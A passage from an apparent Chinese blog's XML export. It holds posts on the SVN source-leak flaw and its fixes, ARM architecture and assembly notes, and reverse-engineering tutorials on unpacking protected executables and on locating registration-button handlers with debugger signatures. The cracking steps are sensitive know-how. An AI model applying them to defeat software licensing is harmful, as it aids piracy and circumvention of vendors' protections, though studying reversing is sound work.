    <content type="text"><![CDATA[产生原因：SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。 漏洞发现： 漏洞利用工具： 防御：1.查找服务器上所有.svn隐藏文件夹，删除；2.开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARM开发技术]]></title>
    <url>%2F2017%2F05%2F10%2FARM%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[ARMARM（ Advanced RISC Machines）有 3 种含义，它是一个公司的名称，是一类微处理器的通称，还是一种技术的名称。主要出售芯片设计技术的授权。 哈佛体系结构程序和数据空间独立的体系结构，重新设计区分了数据总线和指令总线。 ARM9 处理器系列采用了 5 级指令流水线。到 ARM7 为止的 ARM 处理器使用简单的 3 级流水线。取指令、译码、执行。 ARM11 处理器系列8 级流水线， ARMv6 架构。在 Cortex-A8 中有一条 13 级的流水线。 Cortex 处理器系列ARMv7 架构，采用了 Thumb-2 （32位）技术。 ARM处理命名规则后缀名称:T -&gt; ThumbD -&gt; 调试[JTAG]M -&gt; 长乘法I -&gt; 嵌入式ICE单元 [支持设置断点]E -&gt; 增强型DSP指令J -&gt; 支持Java字节码 在命名方式上，基于 ARMv7 架构的 ARM 处理器已经不再延用过去的数字命名方式，而是冠以 Cortex 的代号。基于 v7A 的称为“ Cortex-A 系州”，基于v7R 的称为“ Cortex-R 系列”，基于 v7M 的称为“ Cortex-M3”。 ARM 微处理器结构ARM 内核采用 RISC 体系结构。 ARM 体系结构的主要特征如下：（ 1） 采用大量的寄存器，它们都可以用于多种用途。（ 2） 采用 Load/Store 体系结构。（ 3） 每条指令都条件执行。（ 4） 采用多寄存器的 Load/Store 指令。（ 5） 能够在单时钟周期执行的单条指令内完成一项普通的移位操作和一项普通的 ALU 操作。（ 6） 通过协处理器指令集来扩展 ARM 指令集，包括在编程模式中增加了新的寄存器和数据类型。（ 7） 如果把 Thumb 指令集也当做 ARM 体系结构的一部分，那么在 Thumb 体系结构中还可以高密度 16 位压缩形式表示指令集。 中断控制器ARM 内核只提供快速中断（ FIQ）和标准中断（ IRQ）两个中断向量。但各个半导体厂家在设计芯片时加入了自己定义的中断控制器，以便支持诸如串行口、外部中断、时钟中断等硬件中断。 ARM 的基本数据类型ARM 采用的是 32 位架构， ARM 的基本数据类型有以下 3 种。Ø Byte：字节，8bit。Ø Halfword：半字，16bit（半字必须与 2 字节边界对齐）。Ø Word：字，32bit（字必须与 4 字节边界对齐）。注意：所有数据类型指令的操作数都是字类型的，如“ ADD r1， r0，＃ 0x1”中的操作数“ 0x1”就是以字类型数据处理的。ARM 指令编译后是 4 个字节（与字边界对齐）。 Thumb 指令编译后是 2 个字节（与半字边界对齐）。 存储器大/小端在大端模式下，一个字的高地址放的是数据的低位，而在小端模式下，数据的低位放在内存中的低地址。即低字节放在低地址中。 ARM有几种工作模式？ARM有7个基本工作模式： 用户模式(user)、系统模式(system)、数据访问中止模式(abort)、未定义指令中止模式(undef)、快速中断模式(FIQ)、外部中断模式(IRQ)、管理模式(SVC)。cortex-A系列特有：M (monitor) : 安全模式 记忆方法：USA UFI（不是UFO） SM（你懂的）除用户模式外的其他 7 种处理器模式称为特权模式（ Privileged Modes）。在特权模式下，程序可以访问所有的系统资源，也可以任意地进行处理器模式切换。非特权模式 : 用户模式特权模式 : S,A,U,F,I,S,M异常模式 : abt,udef,fiq,irq,svc ARM有哪几个异常类型？(1)复位异常 -&gt; SVC 模式 [开发板复位](2)未定义异常 -&gt; UDF 模式 [执行未定义的指令](2)软中断异常 -&gt; SVC 模式 [通过SWI指令产生](4)取数据终止 -&gt; ABT 模式 [没有取到数据](5)取指令终止 -&gt; ABT 模式 [没有取指令](6)IRQ中断 -&gt; IRQ 模式 [硬件触发的IRQ中断](7)FIQ中断 -&gt; FIQ 模式 [硬件触发的FIQ中断]处理器模式可以通过软件控制进行切换，也可以通过外部中断或异常处理过程进行切换。 协处理器（ CP15）ARM 处理器支持 16 个协处理器。 存储管理单元（ MMU）MMU 作为转换器，将程序和数据的虚拟地址（编译时的连接地址）转换成实际的物理地址，即在物理主存中的地址。虚拟地址由编译器和连接器在定位程序时分配；物理地址用来访问实际的主存硬件模块（物理上程序存在的区域）。 高速缓冲存储器（ Cache）Cache 经常与写缓存器（ write buffer）一起使用。写缓存器是一个非常小的先进先出（ FIFO）存储器，位于处理器核与主存之间。使用写缓存的目的是，将处理器核和 Cache 从较慢的主存写操作中解脱出来。当 CPU 向主存储器做写入操作时，它先将数据写入到写缓存区中，由于写缓存器的速度很高，这种写入操作的速度也将很高。写缓存区在 CPU 空闲时，以较低的速度将数据写入到主存储器中相应的位置。 当进行数据写操作时Cache未命中，根据Cache执行的操作不同，将Cache分为两类( C )A:数据Cache和指令CacheB:统一Cache和独立CacheC:写通Cache和写回CacheD:读操作分配Cache和写操作分配Cache ARM核有多少个寄存器？ARM 处理器有如下 40 个 32 位长的寄存器。（ 1） 33 个通用寄存器。（ 2） 6 个状态寄存器： 1 个 CPSR（ Current Program Status Register，当前程序状态寄存器）， 6 个SPSR（ Saved Program Status Register，备份程序状态寄存器）。（ 3） 1 个 PC（ Program Counter，程序计数器）。 当前处理器的模式决定着哪组寄存器可操作，任何模式都可以存取下列寄存器。（ 1） 相应的 R0～R12。（ 2） 相应的 R13（ Stack Pointer， SP，栈指向）和 R14（ the Link Register， LR，链路寄存器）。（ 3） 相应的 R15（ PC）。（ 4） 相应的 CPSR。特权模式（除 System 模式外）还可以存取相应的 SPSR。通用寄存器根据其分组与否可分为以下两类。（ 1） 未分组寄存器（ Unbanked Register），包括 R0～R7。（ 2） 分组寄存器（ Banked Register），包括 R8～R14。 哪种模式使用的寄存器最少？用户模式/系统模式（不用SPSR）。 未分组寄存器未分组寄存器包括 R0～R7。顾名思义，在所有处理器模式下对于每一个未分组寄存器来说，指的都是同一个物理寄存器。未分组寄存器没有被系统用于特殊的用途，任何可采用通用寄存器的应用场合都可以使用未分组寄存器。但由于其通用性，在异常中断所引起的处理器模式切换时，其使用的是相同的物理寄存器，所以也就很容易使寄存器中的数据被破坏。切换模式时要保护。 分组寄存器R8～R14 是分组寄存器，它们每一个访问的物理寄存器取决于当前的处理器模式。对于分组寄存器 R8～R12 来说，每个寄存器对应两个不同的物理寄存器。一组用于除 FIQ 模式外的所有处理器模式，而另一组则专门用于 FIQ 模式。这样的结构设计有利于加快 FIQ 的处理速度。不同模式下寄存器的使用，要使用寄存器名后缀加以区分。例如，当使用 FIQ 模式下的寄存器时，寄存器 R8 和寄存器 R9 分别记为 R8_fiq、 R9_fiq；当使用用户模式下的寄存器时，寄存器 R8 和 R9 分别记为 R8_usr、 R9_usr等。在 ARM 体系结构中， R8～R12 没有任何指定的其他的用途，所以当 FIQ 中断到达时，不用保存这些通用寄存器，也就是说， FIQ 处理程序可以不必执行保存和恢复中断现场的指令，从而可以使中断处理过程非常迅速。所以 FIQ 模式常被用来处理一些时间紧急的任务，如 DMA 处理。对于分组寄存器 R13 和 R14 来说，每个寄存器对应 6 个不同的物理寄存器。其中的一个是用户模式和系统模式公用的，而另外 5 个分别用于 5 种异常模式。访问时需要指定它们的模式。R13 寄存器在 ARM 处理器中常用做堆栈指针，称为 SP。寄存器 R14 又被称为连接寄存器（ Link Register， LR）。每一种处理器模式用自己的 R14 存放当前子程序的返回地址。当通过 BL 或 BLX 指令调用子程序时， R14被设置成该子程序的返回地址。在子程序返回时，把 R14 的值复制到程序计数器（ PC）。 程序状态寄存器每一种处理器模式下都有一个专用的物理寄存器做备份程序状态寄存器（ Saved Program StatusRegister， SPSR）。当特定的异常中断发生时，这个物理寄存器负责存放当前程序状态寄存器的内容。当异常处理程序返回时，再将其内容恢复到当前程序状态寄存器。cpsr (反应CPU状态) N Z C V …. I F T mode N : 计算结果为负则置1Z : 记录结果为0,则置1C : 加法计算最高位产生进位,则置1，减法运算没有产生借位，则置1V : 有符号数溢出[两个整数相加，结果为负数,则置1T : 置1(Thumb状态),否则（ARM 状态)F ：置1(禁用FIQ)I : 置1(禁用IRQ)mode : 模式位 总结:(1)所有模式通用 r0-r7 ,pc,CPSR [10](2)除了快中断模式，其他模式共用 : r8-r12 ,快中断模式的r8-r12私有的 [5 + 5 = 10](3)异常模式特有的寄存器 : sp,lr,spsr [5 * 3 = 15](4)用户模式和系统模式共用同一套寄存器(所有的寄存器) : sp,lr [2] 一个模式最多可以访问的寄存器:r0-r12,sp,lr,pc,cpsr,spsr注意:在Thumb状态下，r8-r12是不可见，其他寄存器映射ARM状态的寄存器 ARM异常处理1.ARM 异常类型(1)复位异常 -&gt; SVC 模式 [开发板复位](2)未定义异常 -&gt; UDF 模式 [执行未定义的指令](2)软中断异常 -&gt; SVC 模式 [通过SWI指令产生](4)取数据终止 -&gt; ABT 模式 [没有取到数据](5)取指令终止 -&gt; ABT 模式 [没有取指令](6)IRQ中断 -&gt; IRQ 模式 [硬件触发的IRQ中断](7)FIQ中断 -&gt; FIQ 模式 [硬件触发的FIQ中断] 2.异常产生的时候(1)ARM 核自动完成的事情 CPSR拷贝到异常模式的SPSR 设置CPSR的相应位 进入ARM状态 设为对应的异常模式 禁止中断[中断产生的时候] 将PC保存到异常模式的LR 修改PC的值到异常向量表 异常向量表:一块内存，内存的中存放的是一些跳转指令，跳转异常处理函数 异常向量表可以存放的位置:在非CortexA系列异常，异常向量表可以存放在0x0000,0000 或 0xffff,0000 在CoctexA系列异常向量表可以存放在任何位置，只需将异常向量表所在起始位置告诉CP15[协处理器]的C12寄存器(2)程序员需要的事情 异常进入:保护通用寄存器异常退出:恢复现场[恢复保护的寄存器，恢复LR[异常]到PC , 恢复SPSR[异常]到CPSR] ARM核是如何让FIQ快速处理?FIQ模式有私有的r8-r12,如果只是用私有的寄存器，不需要保护通用寄存器 FIQ异常在异常向量表最顶端，可以直接写FIQ异常处理函数，不需要跳转 ARM 处理器的寻址方式ARM 指令的寻址方式分为数据处理指令寻址方式和内存访问指令寻址方式。 数据处理指令寻址方式可以分为以下几种？（ 1） 立即数寻址方式。（ 2） 寄存器寻址方式。（ 3） 寄存器移位寻址方式。 判断一个数是不是合法的立即数，最好的方法就是拿编译器验证，不是，编译器就会报错。但是在面试或者是笔试的时候，可能会遇到判断立即数的题目，那有没有好的方法判断呢？1.首先将这个数转换为32bits 16进制形式，例如218 = 0xda = 0x000000da2.除零外，仅有一位数字的如0x00100000，为合法立即数该数字可为0-F3.除零外，仅有两位数字，并且相邻（包括首位，如0x1000000A）的为合法立即数。4.除零外，仅有三位数字，并且相邻（包括中间有0相间，例如0x10800000，包括首尾相邻，如：0x14000003），这三位数中最高位取值仅能为1,2,3，最低位取值仅能为4,8,C，中间位0-f，这样的数为合法立即数。5.除去以上三种，其他基本上都是非法立即数。 寄存器寻址方式寄存器的值可以被直接用于数据操作指令，这种寻址方式是各类处理器经常采用的一种方式，也是一种执行效率较高的寻址方式，如：MOV R2,R0 ;R0 的值送 R2ADD R4,R3,R2 ;R2 加 R3，结果送 R4CMP R7,R8 ; 比较 R7 和 R8 的值 #寄存器移位寻址方式寄存器的值在被送到 ALU 之前，可以事先经过桶形移位寄存器的处理。预处理和移位发生在同一周期内，所以有效地使用移位寄存器，可以增加代码的执行效率。下面是一些在指令中使用了移位操作的例子：ADD R2,R0,R1,LSR #5MOV R1,R0,LSL #2RSB R9,R5,R5,LSL #1SUB R1,R2,R0,LSR #4MOV R2,R4,ROR R0 内存访问指令寻址方式内存访问指令的寻址方式可以分为以下几种。（ 1） 字及无符号字节的 Load/Store 指令的寻址方式。（ 2） 杂类 Load/Store 指令的寻址方式。（ 3） 批量 Load/Store 指令的寻址方式。（ 4） 协处理器 Load/Store 指令的寻址方式。 如果在数据处理指令前使用 S 前缀，指令的执行结果将会影响 CPSR 中的标志位。 当 PC 作为目标寄存器且指令中 S 位被设置时，指令在执行跳转操作的同时，将当前处理器模式的 SPSR寄存器的内容复制到 CPSR 中。这种指令“ MOVS PC LR”可以实现从某些异常中断中返回。 汇编加法程序设计.globl _start_start:mov r0,#9 //9 存入 r0mov r1,#15 //15 存入 r1add r1,r1,r0 //r1 与 r0 相加存入 r1stop:b stop.globl指示告诉汇编器，_start这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在第 5.1 节 “目标文件”详细解释）。_start就像C程序的main函数一样特殊，是整个程序的入口，链接器在链接时会查找目标文件中的_start符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个_start符号并且用.globl声明。如果一个符号没有用.globl声明，就表示这个符号不会被链接器用到。 指令助记符{条件}{S} Rd,Rn,{operand2}@指令助记符号 ADD,SUB …@条件 只有在条件满足，指令才会执行 eq,ne,gt,lt,ge,le@S 指令执行结果影响CPSR的N,Z,C,V@Rd 目标寄存器[R0-R15]@Rn 第一个操作数寄存器 [r0-r15]@operand2 第二个操作数 如何判断一个数是否为合法立即数？立即数表示方法 : # + 数字合法立即数 : 如果能从[0-255]直接找到一个数，将这个数循环右移偶数为得到当前的数字，则数字是合法立即数 ,否则为非法立即数。 寄存器移位移位方式: lsl[逻辑左移] ,lsr[逻辑右移] , asr[算术右移：需要关心最高位是否是符号位]例如:ADD r0,r1,r2,lsl #3 //r0 = r1 + (r2 &lt;&lt; 3) 算术运算指令 [+, - , *]1.加法指令ADD Rd,Rn,operand2例如:ADD r0,#5,#6//错误ADD r0,r1,#6 //r0 = r1 + 62.减法指令SUB Rd,Rn,operand2SUB r0,r1,#6 //r0 = r1 - 63.乘法指令MUL Rd,Rn,寄存器例如:MUL r1,r2,r3 //r1 = r2 * r3注意:Rd和Rn不能一样 数据装载指令1.MOV Rd,operand2MOV r0,#5 //r0 = 52.装载任意数据到寄存器LDR Rd,=数据 LDR r0,=0x123456 //r0 = 0x123456伪指令:是给编译器使用的，编译器最终会将这条指令翻成ARM核所能识别的指令3.MVN Rd,operand2MVN r0,#0x10 //r0 = ~ 0x10 按位操作 [按位与，按位或，异或,位清除](1)按位与AND Rd,Rn,operand2AND r0,r1,#5 //r0 = r1 &amp; 5(2)按位或ORR Rd,Rn,operand2ORR r0,r1,#5 //r0 = r1 | 5(3)异或EOR Rd,Rn,operand2EOR r0,r1,#5 //r0 = r1 ^ 5(4)位清除BIC Rd,Rn,operand2 //Rd = Rn &amp; ~ operand2//r0:0xffBIC r0,r0,#3 //r0 = 0xff &amp; ~3 = 0xfc 比较指令CMP Rd,operand2注意:自动影响CPSR的N,Z,C,V eq,ne,gt,lt,ge,le练习: a 的值10if(a &gt;= 5)a ++ ;else a –; mov r0,#10cmp r0,#5addge r0,r0,#1sublt r0,r0,#1 跳转指令B 标签BL 标签 [会将PC的值保存到Lr寄存器]思考:如何实现长跳转?直接给PC赋值 :ldr pc,=lable 内存访问指令 ldr / strldr r0,[r1] //r0 = r1//前索引ldr r0,[r1,#4] //r0 = (r1 + 4)//后索引ldr r0,[r1],#4 //r0 = r1,r1 = r1 + 4 ; data = p ++;//自动索引ldr r0,[r1,#4]! //r0 = *(r1 + 4); r1 = r1 + 4 str r0,[r1] //r1 = r0str r0,[r1,#4] //(r1 + 4) = r0str r0,[r1],#4 //r1 = r0 ,r1 = r1 + 4str r0,[r1,#4]! //(r1 + 4) = r0,r1 = r1 + 4 2.ldm{mode} / stm{mode}mode:IA (increase after) : 先操作数据，后增加地址IB (increase before) : 先增加地址，后操作数据DA (decrement after) : 先操作数据，后减少地址DB (decrement before) : 先减少地址，后操作数据 //进栈/出栈 的方式FD (full decrement)ED (empty decrement)FA (full add)EA (empty add) 中断异常进入的时候，保护通用寄存器sub lr,lr,#4stm{mode} sp!,{r0-r12,lr}bl c_lang //@^表示将SPSR拷贝到CPSRldm{mode} sp!,{r0-r12,pc}^ 多寄存器操作指令STM/LDM{cond}{mode} 基地寄存器{!} {寄存器列表}{^} STM : 将列表中的寄存器写入内存LDM : 从内存中读取数据到寄存器列表 @cond eq,ne,gt,lt,ge,le@mode ia,ib,da,db,fd,fa,ed,ea @基地址寄存器 r0-r13@! 最后更新基地址寄存器@寄存器列表 {r0,r4,r5-r7} @^ 如果寄存器列表没有pc,此时操作的是用户模式的寄存器;如果是LDM指令，并且有pc,此时恢复CPSR 注意:1.大地址对应大寄存器2.寄存器列表从小到大3.堆栈操作的时候，怎么进栈，怎么出栈 stmfd / ldmfd ARM 一些伪指令(1)LDR 的几种写法LDR r0,=0x123456 //r0 = 0x12345678LDR r0,=label //r0 = labelLDR r0,[r1] // r0 = r1LDR r0,lable // r0 = label (2)ADR :小范围的地址装载 ADR r0,label //r0 = label ARM异常处理告诉异常向量表的位置ldr r0,=0x20000mcr p15,0,r0,c12,c0,0 编写异常向量表，在异常向量表中存放跳转指令例如:b handler_swi / ldr pc,=handler_swi 异常处理 保存通用的寄存器[r0-r12] 处理 异常返回,恢复通用的寄存器，恢复PC,恢复CPSR ldr pc,_handler_swi _handler_swi: .word handler_swildr pc,=handler_swiirq:handler_swi:软中断处理获取软中断号，存放到r0 软中断实验_start:异常向量表 reset:mov r0,#10mov r1,#20@告诉ARM核心异常向量表位置ldr r0,=0x20000mcr p15,0,r0,c12,c0,0@切换到用户模式[MRS/MSR]SWI 0x80mov r2,#30stop:b stopsoftware_interrupt:保护通用的寄存器ldr sp,=0x38000stmfd sp!,{r0-r12,lr}获得软中断号，存放在r0恢复现场 ARM 核的异常返回(1)IRQ 和 FIQ 异常指令1[执行] &lt;- IRQ异常到达指令2指令3指令4 &lt;- pc最终:lr 保存指令3的地址返回: pc &lt;- lr - 4 (2)软中断异常swi 0x80 &lt;- 产生软中断异常指令2指令3 &lt;-pc指令4最终:lr 保存指令2的地址返回: pc &lt;- lr (3)预取指令终止异常 :取指令的时候，没有取到指令指令1 &lt;-执行的时候,没有取到指令指令2指令3 &lt;- pc指令4最终:lr 保存指令2地址返回: pc &lt;- lr - 4 [重新取没有取到指令] (4)预取数据终止异常 : 取数据的时候，没有取到数据指令1 &lt;-执行结束后，产生数据终止异常指令2指令3指令4 &lt;- pc最终:lr 保存指令3地址返回: pc &lt;- lr - 8 (5)未定义指令异常 : 指令ARM核不能识别指令指令1 &lt;-执行的时候，ARM核不能识别指令指令2指令3 &lt;- pc指令4最终:lr 保存指令2的地址返回: pc &lt;-lr GCC C语言内联汇编格式asm(“汇编指令1\n”“汇编指令2\n”…:输出列表:输入列表:修改列表); (1)输出列表 : 将寄存器的值赋值给”C”变量 :”=r”(C变量) (2)输入列表 : 将”C”变量值赋值给寄存器 :”r”(C变量) 注意: “=r”(C变量) : 表示C变量可以写 “+r”(C变量) : 表示C变量可以读、可以写 “r” (C变量) : 表示C变量只读 汇编指令中如何引用C变量? 在输出列表和输入列表中，对C变量做编号，第一个C变量为%0,第二个C变量%1,…. (3)修改列表 : 发生变化的寄存器 好处，编译器会这些寄存器先做一个压栈保护]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件按钮事件]]></title>
    <url>%2F2017%2F05%2F08%2F%E8%BD%AF%E4%BB%B6%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Delphi &amp; BC++使用Detect it Easy工具确定软件使用的编译器为Delphi或者是BC++，这两个编译器的按钮特征码相同。OD载入程序，反汇编窗口右键-&gt;查找-&gt;二进制字符串：然后在HEX窗口输入特征码，注意Delphi和BC++的特征码是相同的（“740E8BD38B83????????FF93????????”）：注意勾选整个块。特征码中的问号代表任意数据。在特征码的下面都会传下一个CALL，然后我们在每个特征码的下面的CALL下断点：然后CTRL+L，在所有的特征码下面的CALL下断点。因为我们不知道是哪一个按钮，所以需要在每个按钮都下断点，如果程序比较小，很快，如果程序比较大，按钮事件比较多，可以使用脚本来下断点。断点下完之后，F9运行程序，然后点击关键的注册之类的按钮，程序会停当前按钮的CALL处，然后F7进CALL，就可以找关键CALL和关键跳了。 VB使用同样的方法搜索VB的特征码（“816C24”）：在每个jmp处下断点，然后运行程序，来到断点处，jmp跟过去之后就是按钮事件的处理过程了。 MFC注意，使用MFC和VC++编写的程序，使用PEiD查壳时，都会显示是Visual C++6.0的编译器，两者的区分方法是，使用OD载入程序，在E窗口中，MFC的程序会调用一个mfc42.dll的动态链接库文件，而VC++的程序不会调用这个库。载入MFC程序，在E窗口中双击mfc42.dll，跟进去，然后反汇编窗口中右键-&gt;查找-&gt;命令：“sub eax,0a”，找到之后，在特征码的下面会有一个je跳转，选中je命令行，然后按回车，程序会跟随到跳转处，来到目标地址，找下面的一个CALL，下断点：如果je跳转之后，没有CALL，那就不用管这个特征码，继续查找下一个特征码，知道找到所有的CALL为止。然后全速运行程序，点击按钮之后，程序会在断点处停止，然后在上下文找关键CALL和关键跳即可。 易语言注意，易语言编写的程序，使用PEiD查壳时，显示的编译器也是Visual C++6.0，使用OD载入程序，直接在反汇编窗口中右键-&gt;查找-&gt;二进制字符串，输入易语言的特征码：“FF 25”，如果能够找到，就说明是易语言编写的程序。易语言体：可以看到有一堆的jmp指令，以上就能判断是易语言程序。 下一步查找易语言的按钮事件：二进制字符串“FF 55 FC 5F 5E»ò(e-debug)”，找到之后，会来到CALL处，直接下断：查找剩下的，所有地方都下断点，然后F9运行程序开始调试。 易语言程序还可以使用另一种方式来查找按钮事件，使用E-debug工具：使用OPEN载入易语言程序，然后点击START，运行程序，点击按钮，会显示事件发生的地址：记下事件发生的地址，然后使用OD载入程序，跟踪到这个地址下断点：Ctrl+G，输入要跟随的表达式，输入刚才记录的地址，下断点：F9运行程序，触发断点事件，即可断在此处。 VC++使用PEiD查壳，查找的编译器为VC++6.0，如果找不到易语言和MFC的标志，那就可以判断是vc++写的程序，按钮事件查找方法，直接OD载入程序，在反汇编窗口右键-&gt;查找-&gt;所有命令，输入特征码：“sub eax,0a”：双击跟进去，在下面会有一个je：选中之后，回车，跟过去，在下面的CALL下断点：按照上面的方式找到所有的CALL下断点。然后F9运行程序，点击按钮，程序来到断点处，F7跟进去，注意，进去之后还不是核心按键处理程序，按两次F8之后，才来到核心代码处： 万能断点不需要知道程序使用的编译器和编译语言，直接OD载入程序，直接运行程序，输入假码之后，不要点击按钮：查看user32模块：来到user32模块之后，搜索特征码，右键-&gt;查找-&gt;二进制字符串：“F3A58BC883E103F3A4E8”然后下断点，找到所有的都要下断点。然后回到程序，点击按钮，程序暂停，返回OD，alt+F9，执行到用户代码：然后就到了按键事件处理的代码了。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件编译器识别]]></title>
    <url>%2F2017%2F05%2F08%2F%E8%BD%AF%E4%BB%B6%E7%BC%96%E8%AF%91%E5%99%A8%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[软件使用编译器的识别可以使用Retect it Easy工具：不管软件加了多强的壳，这个工具都可以识别出编译器。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件脱壳技术]]></title>
    <url>%2F2017%2F05%2F06%2F%E8%BD%AF%E4%BB%B6%E8%84%B1%E5%A3%B3%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[简介一般的压缩壳，都有专门的脱壳机可以使用，或者使用万能脱壳机，比如：procdump。而加密壳一般很少有脱壳机，必须手动脱壳。 手动脱壳步骤 查找程序的真正入口点（OEP）（OEP：Original Entry Point原始入口点）查找OEP有如下几种方法：根据跨段指令寻找OEP；根据堆栈平衡原理找OEP；根据变异语言特点找OEP；用内存断点找OEP； 抓取内存映像文件外科程序解压还原后就会跳转到OEP处执行，此时内存映像文件是已解压的程序。这时就可以抓取内存映像文件了（该过程成为Dump）。可以使用LoadPE工具。 输入表重建程序总是需要与系统打交道，每次与系统打交道的途径是API，而API的地址已经替换成了壳的HOOK-API的地址，那程序每一次与系统打交道都会让壳的代码获取一次控制权。重建输入表的关键是获得没有加密的IAT（即导入地址表,Import Address Table），一般的做法是跟踪加壳程序对IAT处理过程，修改相关指令，不让外壳加密IAT。可以使用ImportREC工具。 脱壳方法ESP定律脱壳之前，可以先使用工具PEiD查看下软件使用的是什么加壳技术，使用工具DIE（Detect it easy）查询软件是什么语言开发的：可以看到软件的加壳技术为：ASPack(2.12-2.XX)，使用的编译器为Borland Delphi(-)[-] 查找OEP使用OD载入程序：可以看到载入程序的开头显示的pushad，按下F8执行第一条指令，同时注意观察CPU寄存器，只有ESP寄存器是红色：这种情况一般都可以使用ESP定律。紧接着上一步，右键点击ESP寄存器的数值，选择HW break，会设置一个硬件断点：在菜单栏中选择“调试”-&gt;“硬件断点”，可以查看到这个断点：然后F9全速运行程序，程序听到断点处：然后F8执行出函数返回，如下图所示：到上面的地方，程序就基本上完成了解压缩，也就是脱壳，右键-&gt;分析-&gt;从模块中删除分析：程序完成解压缩，这个地方就是程序的OEP。 抓取内存映像文件上一步完成之后，下一步就是dump映像文件了，先把硬件断点删掉，然后反汇编窗口，右键，使用OllyDump脱壳调试进程：点击保存，注意另外保存一份没有重建输入表的原始内容，因为有的程序重建输入表之后才能打开，有的不重建才能打开。本软件重置输入表之后可以打开，不重置不能打开。 重建输入表上一步已经完成。 最后使用PEiD，再次打开脱壳成功之后的文件，可以看到识别出程序的编译器，而原始程序是识别不到的：使用OD载入，也不会有最开始的提示加壳信息。 单步跟踪法查找OEP使用OD载入程序，一路F8，如果程序跑飞了，需要在跑飞的地方设置断点，然后F7跟进去，再按F8单步向下，直到找到“popad”指令（如果有向上的跳转，在跳转下面一行，按F4直接运行过循环），到了popad之后，离OEP就不远了： 抓取内存映像文件同ESP定律。 重建输入表同ESP定律。 两次断点查找OEP使用OD载入程序，在使用两次断点法之前，需要先设置一下，菜单栏-&gt;选项-&gt;调试设置：在异常标签页中，所有项目全部打上勾，全部忽略。确定之后，点击工具条的M，来到内存页面，找到以程序文件名命名的属主段，在“.rsrc”段下断点：然后shift+F9，运行到断点处，继续切换到内存页面，这个时候内存页面下的第一个断点会消失，接着下第二个断点，在0X00401000处，F2，接着shift+F9，运行到断点处，然后在F8继续运行，找到popad，就离OEP不远了。 抓取内存映像文件同ESP定律。 重建输入表同ESP定律。 最后一次异常法查找OEP使用OD载入程序，在调试设置窗口中，找到异常标签，取消所有的忽略，保存。然后shift+F9，运行程序，记录下需要按几次shift+F9，程序才能运行起来，加入按了三次shift+F9程序才能运行，证明程序有2个异常，重新载入程序，按两次shift+F9，来到断点处，在堆栈窗口中找到“SE处理程序”，右键-&gt;反汇编窗口中跟随：然后设置F2断点，shift+F9运行到断点处，继续单步F8，直到找到popad，离OEP不远了。 抓取内存映像文件同ESP定律。 重建输入表同ESP定律。 SFX自动脱壳法查找OEP使用OD载入程序，菜单栏-&gt;选项-&gt;调试设置-&gt;SFX标签-&gt;字节方式跟踪真正入口处：然后直接重载程序，可以看到左下角的提示窗口显示“跟踪SFX”，然后一直等待程序暂停就行，时间可能会很长，找到入口点之后，程序会自动停下来： 抓取内存映像文件同ESP定律。 重建输入表同ESP定律。 模拟跟踪法主要使用在两次断点法的基础上，如果两次断点，执行到第二个断点之后，在单步F8程序经常跑飞，或者不知道入口点长什么样的时候，可以继续使用模拟跟踪法，使用前提条件，程序停在二次断点法的第二个断点处 ，这个位置离真正的OEP已经很近了，切换到内存窗口，找到“SFX,输入表”：记录下前面的地址，然后在下面的命令窗口输入：“tc eip&lt;00567000”，按下回车即可，跟踪到入口点，程序会自动暂停。 出口标志法pushad：寄存器数据全部入栈，压入32位寄存器，其入栈顺序是:EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI。popad：对应pushad，寄存器数据出栈。导入程序，在反汇编窗口右键-&gt;查找-&gt;命令，或者直接快捷键Ctrl+F，搜索“popad”，注意不要选中整个块，然后单击F4，运行到当前位置，接着F8单步，直到到达OEP：如果找到popad之后，按下F4运行到此处的时候，程序跑飞了，需要继续查找下一个popad，一次类推，直到程序不跑飞为止，然后在F8单步。 秒到OEPOD载入程序，直接F9运行，然后来到堆栈窗口，拉到最底下，从最底下向上翻，找到以程序名命名的第一个字符串：然后选中该行，右键，在反汇编窗口中跟随：然后删除分析，这个时候，堆栈窗口中会显示这个框：沿着框向上找，会找到返回点：然后右键-&gt;反汇编窗口中跟随，转入反汇编窗口，在反汇编窗口中，向上翻，对照常见OEP（先使用工具查下软件使用什么语言编译的，然后找对应语言的OEP对照），找到程序真正的OEP：然后想办法让程序停在此处，选中该行，右键-&gt;数据窗口中跟随-&gt;选择：右键-&gt;断点-&gt;硬件执行在菜单栏-&gt;调试-&gt;硬件断点中，能够看到我们设置的这个断点：然后重新载入程序，运行F9，程序会直接停在OEP处，然后DUMP，就和上面的过程一样了。 如果是强壳，使用上面的办法拖下来之后，可能程序还不能正常运行，还需要修正镜像大小和导入表才可以。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
